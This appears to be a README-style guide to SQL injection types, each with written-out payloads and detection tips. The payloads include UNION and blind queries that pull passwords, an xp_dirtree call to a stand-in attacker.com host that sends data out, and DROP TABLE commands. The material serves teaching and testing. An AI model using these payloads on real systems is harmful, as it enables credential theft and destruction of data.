
<img width="1198" height="586" alt="S" src="https://github.com/user-attachments/assets/aa202b57-8792-4ebf-a893-198faf5ead40" />

## 1. In-Band SQL Injection

**Definition**
In-Band SQL Injection is the most common form of SQLi. The attacker uses the same communication channel to send the malicious payload and receive the results directly in the application’s normal response.

**Mechanics**

1. Attacker injects SQL code into a user input (URL, form field, header).
2. Application concatenates this input into an SQL query and sends it to the database.
3. Database executes the modified query and returns results in the web response.

**Attack Flow**

```
Attacker → Web Application → Database
               ↑             ↓
            Results ←─────────
```

### 1.1 Union-Based SQLi

**Definition**
Combines attacker-controlled query results with the original query using the `UNION` operator.

**Example**
Original query:

```sql
SELECT id, name, price FROM products WHERE id = 5;
```

Injected payload:

```sql
?id=5 UNION SELECT NULL, username, password FROM users-- 
```

If column counts and types match, the response shows product details plus user credentials.

**Detection**

* Test with `ORDER BY n` to find column count.
* Inject `UNION SELECT NULL, NULL,…` and observe data appearing on page.

### 1.2 Error-Based SQLi

**Definition**
Forces the database to generate an error that leaks schema or data information.

**Example**

```sql
?id=5 AND 1=CONVERT(int, (SELECT @@version))-- 
```

If errors are displayed, the message exposes the database version.

**Detection**

* Inject invalid type conversions or syntax errors (e.g., `AND 1=CONVERT(int, 'a')`).
* Enable verbose errors in a controlled environment to confirm leakage.

---

## 2. Blind SQL Injection

**Definition**
Occurs when the application does not return query results or error details. Attackers infer data by observing application behavior or response times.

**Use Case**
When detailed errors are suppressed and UNION injections are blocked.

### 2.1 Boolean-Based Blind SQLi

**Mechanics**
Inject conditional expressions that evaluate to TRUE or FALSE and compare differences in content or status codes.

**Example**

```
?id=5 AND 1=1--   → Normal page (TRUE)  
?id=5 AND 1=2--   → Different page or “No results” (FALSE)  
```

To extract a character:

```sql
?id=5 AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- 
```

If the page matches the TRUE case, the character is ‘a’.

**Detection**

* Automate alternating TRUE and FALSE payloads; compare responses.
* Use scripts to iterate through character values and observe behavior.

### 2.2 Time-Based Blind SQLi

**Mechanics**
Delays the response when a condition is true using database sleep functions.

**Examples**

* MySQL:

  ```sql
  ?id=5 OR IF((SELECT ASCII(SUBSTRING(password,1,1)) FROM users LIMIT 1)>77, SLEEP(5), 0)-- 
  ```
* MSSQL:

  ```sql
  ; IF ((SELECT TOP 1 password FROM users) LIKE 'a%') WAITFOR DELAY '00:00:05'-- 
  ```

**Detection**

* Measure response latency programmatically.
* A consistent delay indicates a TRUE condition.

---

## 3. Out-of-Band (OOB) SQL Injection

**Definition**
Uses two different channels: one to send the payload (web request) and another to receive data (DNS or HTTP requests to an attacker-controlled server).

**Mechanics & Example**

```sql
?id=5; EXEC master..xp_dirtree '\\attacker.com\share'-- 
```

The database performs a DNS lookup or UNC share request to `attacker.com`, exfiltrating data via the network.

**Detection**

* Monitor DNS or HTTP logs on your controlled endpoint.
* Use unique subdomains for each query to reconstruct extracted data.

---

## 4. Second-Order SQL Injection

**Definition**
The malicious payload is stored by the application (e.g., in a profile, log or comment) and executed later in a different context.

**Example Scenario**

1. Attacker registers with name:

   ```sql
   joe'); DROP TABLE orders;--  
   ```
2. Later, an administrative report runs:

   ```sql
   SELECT * FROM users WHERE name = '[stored name]';  
   ```

   The stored payload executes, dropping the `orders` table.

**Detection**

* Audit stored fields for SQL metacharacters (`';--`).
* Review all code paths where stored values are used in queries.

---

## 5. Stacked (Piggy-Backed) Queries

**Definition**
Executes multiple SQL statements in one request by separating them with semicolons.

**Example**

```sql
?id=5; DROP TABLE users;-- 
```

If stacking is permitted by the database driver, the first statement runs the intended query, and the second executes the destructive command.

**Detection**

* Test with payloads like `; DROP TABLE test;--`.
* Confirm whether the database API allows multiple statements.

---

# Summary

| Type                      | Detection Method                                         |
| ------------------------- | -------------------------------------------------------- |
| Union-Based & Error-Based | UNION/ORDER BY tests; force errors                       |
| Boolean-Based Blind       | TRUE/FALSE payloads; response comparison                 |
| Time-Based Blind          | Measure response delays                                  |
| Out-of-Band               | External DNS/HTTP callbacks to controlled host           |
| Second-Order              | Audit stored inputs; code review of later query contexts |
| Stacked Queries           | Semicolon tests; API configuration                       |
